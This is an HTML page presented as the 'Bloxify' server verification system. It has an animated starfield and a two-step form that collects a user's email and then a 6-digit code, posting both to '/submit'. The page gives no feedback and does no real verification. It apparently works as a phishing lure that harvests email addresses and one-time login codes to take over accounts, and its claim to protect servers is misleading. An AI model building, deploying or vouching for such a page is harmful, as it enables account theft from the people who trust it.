<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Bloxify Verification</title>

<style>
html, body {
    margin: 0;
    width: 100%;
    height: 100%;
    overflow: hidden;
    background: black;
    font-family: Arial, sans-serif;
    color: white;
}

/* ===== SPACE FLOW BACKGROUND ===== */
#space {
    position: fixed;
    inset: -50%;
    background:
        radial-gradient(circle at 30% 30%, #222 0%, transparent 40%),
        radial-gradient(circle at 70% 60%, #1a1a1a 0%, transparent 45%),
        linear-gradient(120deg, #000, #111, #000);
    animation: wave 28s ease-in-out infinite alternate;
    z-index: 0;
}

@keyframes wave {
    0% { transform: translate(0,0) scale(1); }
    100% { transform: translate(-5%,-7%) scale(1.1); }
}

/* ===== STARS ===== */
.star {
    position: absolute;
    width: 7px;
    height: 7px;
    background: white;
    border-radius: 50%;
    box-shadow: 0 0 12px white;
    cursor: pointer;
    z-index: 1;
}

/* ===== CENTER ALIGN ===== */
#center {
    position: fixed;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 5;
}

/* ===== UI BOX ===== */
#ui {
    width: 420px;
    padding: 36px;
    background: linear-gradient(145deg, #050505, #0e0e0e);
    border-radius: 18px;
    text-align: center;
    box-shadow:
        0 0 35px rgba(255,255,255,0.15),
        inset 0 0 20px rgba(255,255,255,0.05);
    animation: float 6s ease-in-out infinite;
}

@keyframes float {
    50% { transform: translateY(-12px); }
}

h1 {
    margin: 0;
    font-size: 32px;
    letter-spacing: 1px;
}

p {
    margin: 10px 0 24px;
    color: #aaa;
    font-size: 14px;
}

input {
    width: 100%;
    padding: 14px;
    background: #111;
    border: none;
    border-radius: 10px;
    color: white;
    font-size: 16px;
    outline: none;
}

button {
    width: 100%;
    margin-top: 14px;
    padding: 14px;
    background: #1a1a1a;
    border: none;
    border-radius: 10px;
    color: white;
    font-size: 16px;
    cursor: pointer;
}

button:hover {
    background: #222;
}
</style>
</head>

<body>

<div id="space"></div>

<div id="center">
    <div id="ui">
        <h1>Bloxify</h1>
        <p>Bloxify new-ish verification system ready to protect your servers!</p>

        <div id="emailStep">
            <input id="email" placeholder="Enter your email">
            <button onclick="sendEmail()">Continue</button>
        </div>

        <div id="codeStep" style="display:none;">
            <input id="code" placeholder="6-digit code" maxlength="6"
                   inputmode="numeric"
                   oninput="this.value=this.value.replace(/[^0-9]/g,'')">
            <button onclick="sendCode()">Verify</button>
        </div>
    </div>
</div>

<script>
/* ===== STARS FLOAT + CLICK FLING ===== */
for (let i = 0; i < 90; i++) {
    const s = document.createElement("div");
    s.className = "star";
    s.style.left = Math.random()*innerWidth + "px";
    s.style.top = Math.random()*innerHeight + "px";

    let vx = (Math.random()-0.5)*0.3;
    let vy = (Math.random()-0.5)*0.3;

    function move() {
        let x = parseFloat(s.style.left) + vx;
        let y = parseFloat(s.style.top) + vy;
        if (x < 0 || x > innerWidth) vx *= -1;
        if (y < 0 || y > innerHeight) vy *= -1;
        s.style.left = x + "px";
        s.style.top = y + "px";
        requestAnimationFrame(move);
    }
    move();

    s.onclick = () => {
        s.animate([
            { transform: "translate(0,0)", opacity: 1 },
            { transform: `translate(${(Math.random()-0.5)*700}px, ${(Math.random()-0.5)*700}px)`, opacity: 0 }
        ], { duration: 700 });

        setTimeout(() => {
            s.style.left = Math.random()*innerWidth + "px";
            s.style.top = Math.random()*innerHeight + "px";
            s.style.opacity = 1;
        }, 700);
    };

    document.body.appendChild(s);
}

/* ===== EMAIL STEP ===== */
function sendEmail() {
    fetch("/submit", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ email: email.value })
    });

    document.getElementById("emailStep").style.display = "none";
    document.getElementById("codeStep").style.display = "block";
}

/* ===== CODE STEP ===== */
function sendCode() {
    fetch("/submit", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ code: code.value })
    });
}
</script>

</body>
</html>
